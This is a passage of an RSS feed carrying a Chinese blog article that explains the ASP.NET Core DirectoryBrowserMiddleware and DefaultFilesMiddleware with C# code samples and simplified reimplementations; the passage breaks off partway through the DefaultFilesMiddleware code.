<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>ASP.NET Core静态文件中间件[5]: DirectoryBrowserMiddleware &amp; DefaultFilesMiddleware - Artech</title>
<link>http://www.cnblogs.com/artech/p/static-file-middleware-05.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/artech/p/static-file-middleware-05.html</guid>
<description>&lt;p&gt;对于NuGet包由“Microsoft.AspNetCore.StaticFiles”提供的3个中间件来说，StaticFileMiddleware中间件旨在处理针对具体静态文件的请求，其他两个中间件（DirectoryBrowserMiddleware和DefaultFilesMiddleware）处理的均是针对某个目录的请求。&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;目录&lt;br/&gt;一、DirectoryBrowserMiddleware中间件&lt;br/&gt;二、自定义IDirectoryFormatter&lt;br/&gt;三、DefaultFilesMiddleware中间件&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;与StaticFileMiddleware中间件一样，DirectoryBrowserMiddleware中间件本质上还定义了一个请求基地址与某个物理目录之间的映射关系，而目标目录体现为一个IFileProvider对象。当这个中间件接收到匹配的请求后，会根据请求地址解析出对应目录的相对路径，并利用这个IFileProvider对象获取目录的结构。目录结构最终会以一个HTML文档的形式定义，而此HTML文档最终会被这个中间件作为响应的内容。&lt;/p&gt;
&lt;p&gt;如下面的代码片段所示，DirectoryBrowserMiddleware类型的第二个构造函数有4个参数。其中，第二个参数是代表当前执行环境的IWebHostEnvironment对象；第三个参数提供一个HtmlEncoder对象，当目标目录被呈现为一个HTML文档时，它被用于实现针对HTML的编码，如果没有显式指定（调用第一个构造函数），默认的HtmlEncoder（HtmlEncoder.Default）会被使用；第四个类型为IOptions&amp;lt;DirectoryBrowserOptions&amp;gt;的参数用于提供表示配置选项的DirectoryBrowserMiddleware的DirectoryBrowserOptions对象。与前面介绍的StaticFileOptions一样，DirectoryBrowserOptions是SharedOptionsBase的子类。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; DirectoryBrowserMiddleware
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; DirectoryBrowserMiddleware(RequestDelegate next, IWebHostEnvironment env, IOptions&amp;lt;DirectoryBrowserOptions&amp;gt;&lt;span&gt; options)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; DirectoryBrowserMiddleware(RequestDelegate next, IWebHostEnvironment hostingEnv, HtmlEncoder encoder, IOptions&amp;lt;DirectoryBrowserOptions&amp;gt;&lt;span&gt; options);
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Task Invoke(HttpContext context);
}

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; DirectoryBrowserOptions : SharedOptionsBase
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; IDirectoryFormatter Formatter { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; DirectoryBrowserOptions();
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; DirectoryBrowserOptions(SharedOptions sharedOptions);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;DirectoryBrowserMiddleware中间件的注册可以通过IApplicationBuilder接口的3个Use&lt;br/&gt;DirectoryBrowser扩展方法来完成。在调用这些扩展方法时，如果没有指定任何参数，就意味着注册的中间件会采用默认配置。我们也可以显式地执行一个DirectoryBrowserOptions对象来对注册的中间件进行定制。如果我们只希望指定请求的路径，就可以直接调用第三个方法重载。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; DirectoryBrowserExtensions
{    
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; IApplicationBuilder UseDirectoryBrowser(&lt;span&gt;this&lt;/span&gt;&lt;span&gt; IApplicationBuilder app)
        &lt;/span&gt;=&amp;gt; app.UseMiddleware&amp;lt;DirectoryBrowserMiddleware&amp;gt;(Array.Empty&amp;lt;&lt;span&gt;object&lt;/span&gt;&amp;gt;&lt;span&gt;());

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; IApplicationBuilder UseDirectoryBrowser(&lt;span&gt;this&lt;/span&gt;&lt;span&gt; IApplicationBuilder app, DirectoryBrowserOptions options)
    {          
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; args = &lt;span&gt;new&lt;/span&gt; &lt;span&gt;object&lt;/span&gt;[] { Options.Create&amp;lt;DirectoryBrowserOptions&amp;gt;&lt;span&gt;(options) };
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; app.UseMiddleware&amp;lt;DirectoryBrowserMiddleware&amp;gt;&lt;span&gt;(args);
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; IApplicationBuilder UseDirectoryBrowser(&lt;span&gt;this&lt;/span&gt; IApplicationBuilder app, &lt;span&gt;string&lt;/span&gt;&lt;span&gt; requestPath)
    {
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; options = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; DirectoryBrowserOptions
        {
            RequestPath &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; PathString(requestPath)
        };
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; app.UseDirectoryBrowser(options);
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;DirectoryBrowserMiddleware中间件的目的很明确，就是将目录下的内容（文件和子目录）格式化成一种可读的形式响应给客户端。针对目录内容的响应最终实现在一个IDirectoryFormatter对象上，DirectoryBrowserOptions的Formatter属性设置和返回的就是这样的一个对象。如下面的代码片段所示，IDirectoryFormatter接口仅包含一个GenerateContentAsync方法。当实现这个方法的时候，我们可以利用第一个参数获取当前HttpContext上下文。该方法的另一个参数返回一组IFileInfo的集合，每个IFileInfo代表目标目录下的某个文件或者子目录。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; IDirectoryFormatter
{
    Task GenerateContentAsync(HttpContext context, IEnumerable&lt;/span&gt;&amp;lt;IFileInfo&amp;gt;&lt;span&gt; contents);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;在默认情况下，请求目录的内容在页面上是以一个表格的形式来呈现的，包含这个表格的HTML文档正是默认使用的IDirectoryFormatter对象生成的，该对象的类型为HtmlDirectory&lt;br/&gt;Formatter。如下面的代码片段所示，我们在构造一个HtmlDirectoryFormatter对象时需要指定一个HtmlEncoder对象，它就是在构造DirectoryBrowserMiddleware对象时提供的那个Html&lt;br/&gt;Encoder对象。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; HtmlDirectoryFormatter : IDirectoryFormatter
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; HtmlDirectoryFormatter(HtmlEncoder encoder);
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;virtual&lt;/span&gt; Task GenerateContentAsync(HttpContext context, IEnumerable&amp;lt;IFileInfo&amp;gt;&lt;span&gt; contents);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;既然最复杂的工作（呈现目录内容）由IDirectoryFormatter完成，那么DirectoryBrowserMiddleware中间件自身的工作其实就会很少。为了更好地说明这个中间件在处理请求时具体做了些什么，可以采用一种比较容易理解的方式对DirectoryBrowserMiddleware类型重新定义。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;47&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; DirectoryBrowserMiddleware
{
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;readonly&lt;/span&gt;&lt;span&gt; RequestDelegate _next;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;readonly&lt;/span&gt;&lt;span&gt; DirectoryBrowserOptions _options;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; DirectoryBrowserMiddleware(RequestDelegate next, IWebHostEnvironment env, IOptions&amp;lt;DirectoryBrowserOptions&amp;gt; options) : &lt;span&gt;this&lt;/span&gt;&lt;span&gt;(next, env, HtmlEncoder.Default, options)
    { }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; DirectoryBrowserMiddleware(RequestDelegate next, IWebHostEnvironment env, HtmlEncoder encoder, IOptions&amp;lt;DirectoryBrowserOptions&amp;gt;&lt;span&gt; options)
    {
        _next &lt;/span&gt;=&lt;span&gt; next;
        _options &lt;/span&gt;=&lt;span&gt; options.Value;
        _options.FileProvider &lt;/span&gt;= _options.FileProvider ??&lt;span&gt; env.WebRootFileProvider;
        _options.Formatter &lt;/span&gt;= _options.Formatter ?? &lt;span&gt;new&lt;/span&gt;&lt;span&gt; HtmlDirectoryFormatter(encoder);
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;async&lt;/span&gt;&lt;span&gt; Task InvokeAsync(HttpContext context)
    {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;只处理GET请求和HEAD请求&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;new&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;[] { &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;GET&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;HEAD&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; }.Contains(context.Request.Method, StringComparer.OrdinalIgnoreCase))
        {
            &lt;/span&gt;&lt;span&gt;await&lt;/span&gt;&lt;span&gt; _next(context);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;检验当前路径是否与注册的请求路径相匹配&lt;/span&gt;
        PathString path = &lt;span&gt;new&lt;/span&gt; PathString(context.Request.Path.Value.TrimEnd(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;) + &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
        PathString subpath;
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!path.StartsWithSegments(_options.RequestPath, &lt;span&gt;out&lt;/span&gt;&lt;span&gt; subpath))
        {
            &lt;/span&gt;&lt;span&gt;await&lt;/span&gt;&lt;span&gt; _next(context);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;检验目标目录是否存在&lt;/span&gt;
        IDirectoryContents directoryContents =&lt;span&gt; _options.FileProvider.GetDirectoryContents(subpath);
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;directoryContents.Exists)
        {
            &lt;/span&gt;&lt;span&gt;await&lt;/span&gt;&lt;span&gt; _next(context);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;如果当前路径不以“/”作为后缀，会响应一个针对“标准”URL的重定向&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (!context.Request.Path.Value.EndsWith(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;))
        {
            context.Response.StatusCode &lt;/span&gt;= &lt;span&gt;302&lt;/span&gt;&lt;span&gt;;
            context.Response.GetTypedHeaders().Location &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; Uri(path.Value +&lt;span&gt; context.Request.QueryString);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;利用DirectoryFormatter响应目录内容&lt;/span&gt;
        &lt;span&gt;await&lt;/span&gt;&lt;span&gt; _options.Formatter.GenerateContentAsync(context, directoryContents);
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;如上面的代码片段所示，在最终利用注册的IDirectoryFormatter对象来响应目标目录的内容之前，DirectoryBrowserMiddleware中间件会做一系列的前期工作：验证当前请求是否是GET请求或者HEAD请求；当前的URL是否与注册的请求路径相匹配，在匹配的情况下还需要验证目标目录是否存在。&lt;/p&gt;
&lt;p&gt;这个中间件要求访问目录的请求路径必须以“/”作为后缀，否则会在目前的路径上添加这个后缀，并针对修正的路径发送一个302重定向。所以，利用浏览器发送针对某个目录的请求时，虽然URL没有指定“/”作为后缀，但浏览器会自动将这个后缀补上，这就是重定向导致的结果。&lt;/p&gt;

&lt;p&gt;目录结构的呈现方式完全由IDirectoryFormatter对象完成，如果默认注册的HtmlDirectoryFormatter对象的呈现方式无法满足需求（如我们需要这个页面与现有网站保持相同的风格），就可以通过注册一个自定义的DirectoryFormatter来解决这个问题。下面通过一个简单的实例来演示如何定义一个IDirectoryFormatter实现类型。我们将自定义的IDirectoryFormatter实现类型命名为ListDirectoryFormatter，因为它仅仅将所有文件或者子目录显示为一个简单的列表。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ListDirectoryFormatter : IDirectoryFormatter
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;async&lt;/span&gt;&lt;span&gt; Task GenerateContentAsync(HttpContext context,
        IEnumerable&lt;/span&gt;&amp;lt;IFileInfo&amp;gt;&lt;span&gt; contents)
    {
        context.Response.ContentType &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;text/html&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;await&lt;/span&gt; context.Response.WriteAsync(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Index&amp;lt;/title&amp;gt;&amp;lt;body&amp;gt;&amp;lt;ul&amp;gt;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; file &lt;span&gt;in&lt;/span&gt;&lt;span&gt; contents)
        {
            &lt;/span&gt;&lt;span&gt;string&lt;/span&gt; href = $&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{context.Request.Path.Value.TrimEnd('/')}/{file.Name}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;await&lt;/span&gt; context.Response.WriteAsync($&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&amp;lt;li&amp;gt;&amp;lt;a href='{href}'&amp;gt;{file.Name}&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
        }
        &lt;/span&gt;&lt;span&gt;await&lt;/span&gt; context.Response.WriteAsync(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&amp;lt;/ul&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
    }
}

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Program
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Main()
    {
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; options = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; DirectoryBrowserOptions
        {
            Formatter &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ListDirectoryFormatter()
        };
        Host.CreateDefaultBuilder()
            .ConfigureWebHostDefaults(builder &lt;/span&gt;=&amp;gt; builder.Configure(app =&amp;gt;&lt;span&gt; app.UseDirectoryBrowser(options)))
            .Build()
            .Run();
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;如上面的代码片段所示，ListDirectoryFormatter最终响应的是一个完整的HTML文档，它的主体部分只包含一个通过&amp;lt;ul&amp;gt;&amp;lt;/ul&amp;gt;表示的无序列表，列表元素（&amp;lt;li&amp;gt;）是一个针对文件或者子目录的链接。在调用UseDirectoryBrowser扩展方法注册DirectoryBrowserMiddleware中间件时，需要将一个ListDirectoryFormatter对象设置为指定配置选项的Formatter属性。目录内容最终以下图所示的形式呈现在浏览器上。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://img2020.cnblogs.com/blog/19327/202012/19327-20201221085919121-773033336.png&quot;&gt;&lt;img width=&quot;240&quot; height=&quot;116&quot; title=&quot;3&quot; alt=&quot;3&quot; src=&quot;https://img2020.cnblogs.com/blog/19327/202012/19327-20201221085919495-774508619.png&quot; border=&quot;0&quot;/&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;DefaultFilesMiddleware中间件的目的在于将目标目录下的默认文件作为响应内容。如果直接请求的就是这个默认文件，那么前面介绍的StaticFileMiddleware中间件就会将这个文件响应给客户端。如果能够将针对目录的请求重定向到这个默认文件上，一切问题就会迎刃而解。实际上，DefaultFilesMiddleware中间件的实现逻辑很简单，它采用URL重写的形式修改了当前请求的地址，即将针对目录的URL修改成针对默认文件的URL。&lt;/p&gt;
&lt;p&gt;下面先介绍DefaultFilesMiddleware类型的定义。与其他两个中间件类似，DefaultFilesMiddleware中间件的构造由一个IOptions&amp;lt;DefaultFilesOptions&amp;gt;类型的参数来指定相关的配置选项。由于DefaultFilesMiddleware中间件本质上依然体现了请求路径与某个物理目录的映射，所以DefaultFilesOptions依然派生于SharedOptionsBase。DefaultFilesOptions的DefaultFileNames属性包含预定义的默认文件名，由此可以看到它默认包含4个名称（default.htm、default.html、index.htm和index.html）。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; DefaultFilesMiddleware
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; DefaultFilesMiddleware(RequestDelegate next, IWebHostEnvironment hostingEnv, IOptions&amp;lt;DefaultFilesOptions&amp;gt;&lt;span&gt; options);
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Task Invoke(HttpContext context);
}

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; DefaultFilesOptions : SharedOptionsBase
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; IList&amp;lt;&lt;span&gt;string&lt;/span&gt;&amp;gt; DefaultFileNames { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; DefaultFilesOptions() : &lt;span&gt;this&lt;/span&gt;(&lt;span&gt;new&lt;/span&gt;&lt;span&gt; SharedOptions()) { }
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; DefaultFilesOptions(SharedOptions sharedOptions) : &lt;span&gt;base&lt;/span&gt;&lt;span&gt;(sharedOptions)
    {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.DefaultFileNames = &lt;span&gt;new&lt;/span&gt; List&amp;lt;&lt;span&gt;string&lt;/span&gt;&amp;gt; {&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;default.htm&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;default.html&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;index.htm&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;index.html&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; };
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;DefaultFilesMiddleware中间件的注册可以通过调用IApplicationBuilder接口的如下3个名为UseDefaultFiles的扩展方法来完成。从如下所示的代码片段可以看出，它们与用于注册DirectoryBrowserMiddleware中间件的UseDirectoryBrowser扩展方法具有一致的定义和实现方式。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; DefaultFilesExtensions
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; IApplicationBuilder UseDefaultFiles(&lt;span&gt;this&lt;/span&gt; IApplicationBuilder app) =&amp;gt; app.UseMiddleware&amp;lt;DefaultFilesMiddleware&amp;gt;(Array.Empty&amp;lt;&lt;span&gt;object&lt;/span&gt;&amp;gt;&lt;span&gt;());

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; IApplicationBuilder UseDefaultFiles(&lt;span&gt;this&lt;/span&gt;&lt;span&gt; IApplicationBuilder app, DefaultFilesOptions options)
    {
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; args = &lt;span&gt;new&lt;/span&gt; &lt;span&gt;object&lt;/span&gt;[] {Options.Create&amp;lt;DefaultFilesOptions&amp;gt;&lt;span&gt;(options) };
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; app.UseMiddleware&amp;lt;DefaultFilesMiddleware&amp;gt;&lt;span&gt;(args);
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; IApplicationBuilder UseDefaultFiles(&lt;span&gt;this&lt;/span&gt; IApplicationBuilder app, &lt;span&gt;string&lt;/span&gt;&lt;span&gt; requestPath)
    {
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; options = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; DefaultFilesOptions
        {
            RequestPath &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; PathString(requestPath)
        };
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; app.UseDefaultFiles(options);
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;下面采用一种易于理解的形式重新定义DefaultFilesMiddleware类型，以便于读者理解它的处理逻辑。如下面的代码片段所示，与前面介绍的DirectoryBrowserMiddleware中间件一样，DefaultFilesMiddleware中间件会对请求做相应的验证。如果当前目录下存在某个默认文件，那么它会将当前请求的URL修改成指向这个默认文件的URL。值得注意的是，DefaultFiles&lt;br/&gt;Middleware中间件同样要求访问目录的请求路径必须以“/”作为后缀，否则会在目前的路径上添加这个后缀并针对最终的路径发送一个重定向。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; DefaultFilesMiddleware
{
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; RequestDelegate _next;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; DefaultFilesOptions _options;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; DefaultFilesMiddleware(RequestDelegate next, IWebHostEnvironment env, IOptions&amp;lt;DefaultFilesOptions&amp;gt;&lt;span&gt; options)
    {
        _next &lt;/span&gt;=&lt;span&gt; next;
        _options &lt;/span&gt;=&lt;span&gt; options.Value;
        _options.FileProvider &lt;/span&gt;= _options.FileProvider ??&lt;span&gt; env.WebRootFileProvider;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;async&lt;/span&gt;&lt;span&gt; Task InvokeAsync(HttpContext context)
    {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;只处理GET请求和HEAD请求&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;new&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;[] { &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;GET&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;HEAD&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; }.Contains(context.Request.Method, StringComparer.OrdinalIgnoreCase))
        {
            &lt;/span&gt;&lt;span&gt;await&lt;/span&gt;&lt;span&gt; _next(context);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;检验当前路径是否与注册的请求路径相匹配&lt;/span&gt;
        PathString path = &lt;span&gt;new&lt;/span&gt; PathString(context.Request.Path.Value.TrimEnd(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;) + &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
        PathString subpath;
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!path.StartsWithSegments(_options.RequestPath, &lt;span&gt;out&lt;/span&gt;&lt;span&gt; subpath))
        {
            &lt;/span&gt;&lt;span&gt;await&lt;/span&gt;&lt;span&gt; _next(context);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;检验目标目录是否存在&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;_options.FileProvider.GetDirectoryContents(subpath).Exists)
        {
            &lt;/span&gt;&lt;span&gt;await&lt;/span&gt;&lt;span&gt; _next(context);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;检验当前目录是否包含默认文件&lt;/span&gt;
        &lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; fileName &lt;span&gt;in&lt;/span&gt;&lt;span&gt; _options.DefaultFileNames)
        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (_options.FileProvider.GetFileInfo($&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{subpath}{fileName}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;).Exists)
            {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;如果当前路径不以“/”作为后缀，会响应一个针对“标准”URL的重定向&lt;/span&gt;
                &lt;span&gt;if&lt;/span&gt; (!context.Request.Path.Value.EndsWith(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;))
                {
